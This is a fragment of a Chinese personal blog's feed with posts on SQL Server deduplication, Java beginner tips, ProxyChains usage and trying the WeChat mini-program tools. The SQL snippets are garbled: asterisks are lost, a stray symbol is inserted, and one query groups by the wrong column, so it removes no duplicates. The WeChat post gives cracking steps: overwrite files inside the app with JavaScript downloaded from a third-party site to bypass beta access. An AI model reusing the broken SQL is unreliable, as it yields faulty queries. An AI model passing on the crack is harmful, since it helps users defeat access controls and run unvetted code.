align="top"></font></span><font face="Courier New"><span style="color: #0000ff">declare</span><span style="color: #000000">&nbsp;</span><span style="color: #008000">@max</span><span style="color: #000000">&nbsp;</span><span style="font-weight: bold; color: #000000">integer</span><span style="color: #000000">,</span><span style="color: #008000">@id</span><span style="color: #000000">&nbsp;</span><span style="font-weight: bold; color: #000000">integer</span></font><span style="color: #000000"><br><br><font face="Courier New"><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></font></span><font face="Courier New"><span style="color: #0000ff">declare</span><span style="color: #000000">&nbsp;cur_rows&nbsp;</span><span style="color: #0000ff">cursor</span><span style="color: #000000">&nbsp;local&nbsp;</span><span style="color: #0000ff">for</span><span style="color: #000000">&nbsp;</span><span style="color: #0000ff">select</span><span style="color: #000000">&nbsp;主字段,</span><span style="color: #ff00ff">count</span><span style="color: #000000">(</span><span style="color: #808080"></span><span style="color: #000000">)&nbsp;</span><span style="color: #0000ff">from</span><span style="color: #000000">&nbsp;表名&nbsp;</span><span style="color: #0000ff">group</span><span style="color: #000000">&nbsp;</span><span style="color: #0000ff">by</span><span style="color: #000000">&nbsp;主字段&nbsp;</span><span style="color: #0000ff">having</span><span style="color: #000000">&nbsp;</span><span style="color: #ff00ff">count</span><span style="color: #000000">(</span><span style="color: #808080"><em></em></span><span style="color: #000000">)&nbsp;</span><span style="color: #808080">&gt;</span><span style="color: #000000">；&nbsp;</span><span style="font-weight: bold; color: #800000">1</span></font><span style="color: #000000"><br><br><font face="Courier New"><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></font></span><span style="color: #0000ff"><font face="Courier New">open</font></span><font face="Courier New"><span style="color: #000000">&nbsp;cur_rows<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></span><span style="color: #0000ff">fetch</span><span style="color: #000000">&nbsp;cur_rows&nbsp;</span><span style="color: #0000ff">into</span><span style="color: #000000">&nbsp;</span><span style="color: #008000">@id</span><span style="color: #000000">,</span><span style="color: #008000">@max</span></font><span style="color: #000000"><br><br><font face="Courier New"><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></font></span><font face="Courier New"><span style="color: #0000ff">while</span><span style="color: #000000">&nbsp;</span><span style="font-weight: bold; color: #008000">@@fetch_status</span><span style="color: #808080">=</span><span style="font-weight: bold; color: #800000">0</span></font><span style="color: #000000"><br><br><font face="Courier New"><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></font></span><span style="color: #0000ff"><font face="Courier New">begin</font></span><span style="color: #000000"><br><br><font face="Courier New"><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></font></span><font face="Courier New"><span style="color: #0000ff">select</span><span style="color: #000000">&nbsp;</span><span style="color: #008000">@max</span><span style="color: #000000">&nbsp;</span><span style="color: #808080">=</span><span style="color: #000000">&nbsp;</span><span style="color: #008000">@max</span><span style="color: #000000">&nbsp;</span><span style="color: #808080">-</span><span style="font-weight: bold; color: #800000">1</span></font><span style="color: #000000"><br><br><font face="Courier New"><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></font></span><font face="Courier New"><span style="color: #0000ff">set</span><span style="color: #000000">&nbsp;</span><span style="color: #0000ff">rowcount</span><span style="color: #000000">&nbsp;</span><span style="color: #008000">@max</span></font><span style="color: #000000"><br><br><font face="Courier New"><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></font></span><font face="Courier New"><span style="color: #0000ff">delete</span><span style="color: #000000">&nbsp;</span><span style="color: #0000ff">from</span><span style="color: #000000">&nbsp;表名&nbsp;</span><span style="color: #0000ff">where</span><span style="color: #000000">&nbsp;主字段&nbsp;</span><span style="color: #808080">=</span><span style="color: #000000">&nbsp;</span><span style="color: #008000">@id</span></font><span style="color: #000000"><br><br><font face="Courier New"><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></font></span><font face="Courier New"><span style="color: #0000ff">fetch</span><span style="color: #000000">&nbsp;cur_rows&nbsp;</span><span style="color: #0000ff">into</span><span style="color: #000000">&nbsp;</span><span style="color: #008000">@id</span><span style="color: #000000">,</span><span style="color: #008000">@max</span></font><span style="color: #000000"><br><br><font face="Courier New"><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></font></span><span style="color: #0000ff"><font face="Courier New">end</font></span><span style="color: #000000"><br><br><font face="Courier New"><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></font></span><span style="color: #0000ff"><font face="Courier New">close</font></span><font face="Courier New"><span style="color: #000000">&nbsp;cur_rows<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></span><span style="color: #0000ff">set</span><span style="color: #000000">&nbsp;</span><span style="color: #0000ff">rowcount</span><span style="color: #000000">&nbsp;</span><span style="font-weight: bold; color: #800000">0</span></font><span style="color: #000000"><br><br><font face="Courier New"><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top">方法二<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top">　　有两个意义上的重复记录，一是完全重复的记录，也即所有字段均重复的记录，二是部分关键字段重复的记录，比如Name字段重复，而其他字段不一定重复或都重复可以忽略。<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></font></span><span style="font-weight: bold; color: #800000"><font face="Courier New">1</font></span><font face="Courier New"><span style="color: #000000">、对于第一种重复，比较容易解决，使用<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></span><span style="color: #0000ff">select</span><span style="color: #000000">&nbsp;</span><span style="color: #0000ff">distinct</span><span style="color: #000000">&nbsp;</span><span style="color: #808080"></span><span style="color: #000000">&nbsp;</span><span style="color: #0000ff">from</span></font><font face="Courier New"><span style="color: #000000">&nbsp;tableName<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top">就可以得到无重复记录的结果集。<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top">如果该表需要删除重复的记录（重复记录保留1条），可以按以下方法删除<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></span><span style="color: #0000ff">select</span><span style="color: #000000">&nbsp;</span><span style="color: #0000ff">distinct</span><span style="color: #000000">&nbsp;</span><span style="color: #808080"><em></em></span><span style="color: #000000">&nbsp;</span><span style="color: #0000ff">into</span><span style="color: #000000">&nbsp;#Tmp&nbsp;</span><span style="color: #0000ff">from</span></font><font face="Courier New"><span style="color: #000000">&nbsp;tableName<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></span><span style="color: #0000ff">drop</span><span style="color: #000000">&nbsp;</span><span style="color: #0000ff">table</span></font><font face="Courier New"><span style="color: #000000">&nbsp;tableName<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></span><span style="color: #0000ff">select</span><span style="color: #000000">&nbsp;</span><span style="color: #808080"></span><span style="color: #000000">&nbsp;</span><span style="color: #0000ff">into</span><span style="color: #000000">&nbsp;tableName&nbsp;</span><span style="color: #0000ff">from</span></font><font face="Courier New"><span style="color: #000000">&nbsp;#Tmp<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></span><span style="color: #0000ff">drop</span><span style="color: #000000">&nbsp;</span><span style="color: #0000ff">table</span></font><font face="Courier New"><span style="color: #000000">&nbsp;#Tmp<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top">发生这种重复的原因是表设计不周产生的，增加唯一索引列即可解决。<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></span><span style="font-weight: bold; color: #800000">2</span></font><font face="Courier New"><span style="color: #000000">、这类重复问题通常要求保留重复记录中的第一条记录，操作方法如下<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top">假设有重复的字段为Name,Address，要求得到这两个字段唯一的结果集<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></span><span style="color: #0000ff">select</span><span style="color: #000000">&nbsp;</span><span style="color: #ff00ff">identity</span><span style="color: #000000">(</span><span style="font-weight: bold; color: #000000">int</span><span style="color: #000000">,</span><span style="font-weight: bold; color: #800000">1</span><span style="color: #000000">,</span><span style="font-weight: bold; color: #800000">1</span><span style="color: #000000">)&nbsp;</span><span style="color: #0000ff">as</span><span style="color: #000000">&nbsp;autoID,&nbsp;</span><span style="color: #808080"><em></em></span><span style="color: #000000">&nbsp;</span><span style="color: #0000ff">into</span><span style="color: #000000">&nbsp;#Tmp&nbsp;</span><span style="color: #0000ff">from</span></font><font face="Courier New"><span style="color: #000000">&nbsp;tableName<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></span><span style="color: #0000ff">select</span><span style="color: #000000">&nbsp;</span><span style="color: #ff00ff">min</span><span style="color: #000000">(autoID)&nbsp;</span><span style="color: #0000ff">as</span><span style="color: #000000">&nbsp;autoID&nbsp;</span><span style="color: #0000ff">into</span><span style="color: #000000">&nbsp;#Tmp2&nbsp;</span><span style="color: #0000ff">from</span><span style="color: #000000">&nbsp;#Tmp&nbsp;</span><span style="color: #0000ff">group</span><span style="color: #000000">&nbsp;</span><span style="color: #0000ff">by</span></font><font face="Courier New"><span style="color: #000000">&nbsp;Name,autoID<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></span><span style="color: #0000ff">select</span><span style="color: #000000">&nbsp;</span><span style="color: #808080"></span><span style="color: #000000">&nbsp;</span><span style="color: #0000ff">from</span><span style="color: #000000">&nbsp;#Tmp&nbsp;</span><span style="color: #0000ff">where</span><span style="color: #000000">&nbsp;autoID&nbsp;</span><span style="color: #808080">in</span><span style="color: #000000">(</span><span style="color: #0000ff">select</span><span style="color: #000000">&nbsp;autoID&nbsp;</span><span style="color: #0000ff">from</span></font><font face="Courier New"><span style="color: #000000">&nbsp;#tmp2)<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top">最后一个select即得到了Name，Address不重复的结果集（但多了一个autoID字段，实际写时可以写在select子句中省去此列）<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top">(四)</span></font></div><br><div><font face="Courier New"><span style="color: #000000"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top">查询重复<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></span><span style="color: #0000ff">select</span><span style="color: #000000">&nbsp;</span><span style="color: #808080">*</span><span style="color: #000000">&nbsp;</span><span style="color: #0000ff">from</span><span style="color: #000000">&nbsp;tablename&nbsp;</span><span style="color: #0000ff">where</span><span style="color: #000000">&nbsp;id&nbsp;</span><span style="color: #808080">in</span></font><font face="Courier New"><span style="color: #000000">&nbsp;(<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></span><span style="color: #0000ff">select</span><span style="color: #000000">&nbsp;id&nbsp;</span><span style="color: #0000ff">from</span></font><font face="Courier New"><span style="color: #000000">&nbsp;tablename&nbsp;<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></span><span style="color: #0000ff">group</span><span style="color: #000000">&nbsp;</span><span style="color: #0000ff">by</span></font><font face="Courier New"><span style="color: #000000">&nbsp;id&nbsp;<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></span><span style="color: #0000ff">having</span><span style="color: #000000">&nbsp;</span><span style="color: #ff00ff">count</span><span style="color: #000000">(id)&nbsp;</span><span style="color: #808080">&gt;</span><span style="color: #000000">&nbsp;</span><span style="font-weight: bold; color: #800000">1</span></font><span style="color: #000000"><br><br><font face="Courier New"><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top">)</font></span></div><br></div>]]></content>
    
    <summary type="html">
    
      &lt;div id=&quot;cnblogs_post_body&quot;&gt;&lt;div&gt;&lt;span style=&quot;font-weight: bold; color: #800000&quot;&gt;&lt;font face=&quot;Courier New&quot;&gt;&amp;nbsp;1&lt;/font&gt;&lt;/span&gt;&lt;font face=&quot;C
    
    </summary>
    
      <category term="Sql" scheme="http://blog.yfgeek.com/categories/Sql/"/>
    
    
      <category term="Sql" scheme="http://blog.yfgeek.com/tags/Sql/"/>
    
  </entry>
  
  <entry>
    <title>Java初学者小经验</title>
    <link href="http://blog.yfgeek.com/2016/09/30/Java%E5%88%9D%E5%AD%A6%E8%80%85%E5%B0%8F%E7%BB%8F%E9%AA%8C/"/>
    <id>http://blog.yfgeek.com/2016/09/30/Java初学者小经验/</id>
    <published>2016-09-30T11:47:27.000Z</published>
    <updated>2016-11-19T11:35:18.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java初学者小技巧"><a href="#Java初学者小技巧" class="headerlink" title="Java初学者小技巧"></a>Java初学者小技巧</h1><p>我是个Java新手，总结了一些经验</p>
<h2 id="构造器和方法的区别"><a href="#构造器和方法的区别" class="headerlink" title="构造器和方法的区别"></a>构造器和方法的区别</h2><p><table><tbody><tr></tr><tr><th><font>主题</font></th><th><font>构造器</font></th><th><font>方法</font></th></tr><tr><td><font>功能</font></td><td><font>建立一个类的实例</font></td><td><font>java功能语句</font></td></tr><tr><td><font>修饰</font></td><td><font>不能用<code>bstract</code>, <code>final</code>, <code>native</code>, <code>static</code>, or <code>synchronized</code></font></td><td><font>能<code></code></font></td></tr><tr><td><font>返回类型</font></td><td><font>没有返回值，没有void<code></code></font></td><td><code><font>有返回值，或者void</font></code></td></tr><tr><td><font>命名</font></td><td><font>和类名相同；通常为名词，大写开头</font></td><td><font>通常代表一个动词的意思，小写开头</font></td></tr><tr><td><code><font>this</font></code></td><td><font>指向同一个类中另外一个构造器，在第一行</font></td><td><font>指向当前类的一个实例，不能用于静态方法</font></td></tr><tr><td><code><font>super</font></code></td><td><font>调用父类的构造器，在第一行</font></td><td><font>调用父类中一个重载的方法</font></td></tr><tr><td><font>继承</font></td><td><font>构造器不能被继承</font></td><td><font>方法可以被继承</font></td></tr><tr><td><font>编译器自动加入一个缺省的构造器</font></td><td><font>自动加入（如果没有）</font></td><td><font>不支持</font></td></tr><tr><td><font>编译器自动加入一个缺省的调用到超类的构造器</font></td><td><font>自动加入（如果没有）</font></td><td><font>不支持</font></td></tr></tbody></table></p>
<h1 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h1><ul>
<li>输入args<h1 id="Eclipse"><a href="#Eclipse" class="headerlink" title="Eclipse"></a>Eclipse</h1></li>
<li><code>alt + /</code> 自动补全</li>
<li><code>ctrl+shift+F</code> 格式化代码</li>
<li></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Java初学者小技巧&quot;&gt;&lt;a href=&quot;#Java初学者小技巧&quot; class=&quot;headerlink&quot; title=&quot;Java初学者小技巧&quot;&gt;&lt;/a&gt;Java初学者小技巧&lt;/h1&gt;&lt;p&gt;我是个Java新手，总结了一些经验&lt;/p&gt;
&lt;h2 id=&quot;构造器和方法的区
    
    </summary>
    
      <category term="Java" scheme="http://blog.yfgeek.com/categories/Java/"/>
    
    
      <category term="Java" scheme="http://blog.yfgeek.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>使用ProxyChains进行终端代理</title>
    <link href="http://blog.yfgeek.com/2016/09/26/%E4%BD%BF%E7%94%A8ProxyChains%E8%BF%9B%E8%A1%8C%E7%BB%88%E7%AB%AF%E4%BB%A3%E7%90%86/"/>
    <id>http://blog.yfgeek.com/2016/09/26/使用ProxyChains进行终端代理/</id>
    <published>2016-09-25T23:46:04.000Z</published>
    <updated>2016-11-19T11:35:18.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">brew install proxychains-ng</div></pre></td></tr></table></figure>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vi /usr/local/etc/proxychains.conf</div></pre></td></tr></table></figure>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">proxychains4 ssh xx:xx@xx.com</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div c
    
    </summary>
    
      <category term="Hack" scheme="http://blog.yfgeek.com/categories/Hack/"/>
    
    
      <category term="Hack" scheme="http://blog.yfgeek.com/tags/Hack/"/>
    
  </entry>
  
  <entry>
    <title>微信小程序的一些感想</title>
    <link href="http://blog.yfgeek.com/2016/09/25/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E6%84%9F%E6%83%B3/"/>
    <id>http://blog.yfgeek.com/2016/09/25/微信小程序的一些感想/</id>
    <published>2016-09-25T17:50:00.000Z</published>
    <updated>2016-11-19T12:08:53.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这几天简直火爆了所有的社区的微信小程序，现在有时间可以试一试了。<br><a id="more"></a> </p>
<h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p>微信小程序目前正处于内测阶段，所以我这个算是尝鲜，用的破解版。<br>Mac版下载地址：<br><a href="http://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100.dmg" target="_blank" rel="external">http://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100.dmg</a></p>
<p>windows下载地址：<br><a href="http://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100_x64.exe" target="_blank" rel="external">http://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100_x64.exe</a></p>
<h1 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h1><p>如果你不是内测用户，你需要破解，先下载以下文件。</p>
<p>文件1：</p>
<p><a href="http://source.lattecake.com/files/2016/09/createstep.js" target="_blank" rel="external">http://source.lattecake.com/files/2016/09/createstep.js</a></p>
<p>文件2：</p>
<p><a href="http://source.lattecake.com/files/2016/09/projectStores.js" target="_blank" rel="external">http://source.lattecake.com/files/2016/09/projectStores.js</a></p>
<p>替换路径：</p>
<p>createstep.js -&gt; /Applications/wechatwebdevtools.app/Contents/Resources/app.nw/app/dist/components/create/createstep.js</p>
<p>projectStores.js -&gt; /Applications/wechatwebdevtools.app/Contents/Resources/app.nw/app/dist/stroes/projectStores.js</p>
<h1 id="尝鲜"><a href="#尝鲜" class="headerlink" title="尝鲜"></a>尝鲜</h1><p><img src="/content/images/wechat/1.jpg" alt=""></p>
<p><img src="/content/images/wechat/2.jpg" alt=""><br>做了一次简单的尝鲜，写了一个hellowolrd，微信小程序是由几个最基础的文件构成的：</p>
<ul>
<li>app.js</li>
<li>app.wxss</li>
<li>app.json</li>
<li>app.wxml</li>
</ul>
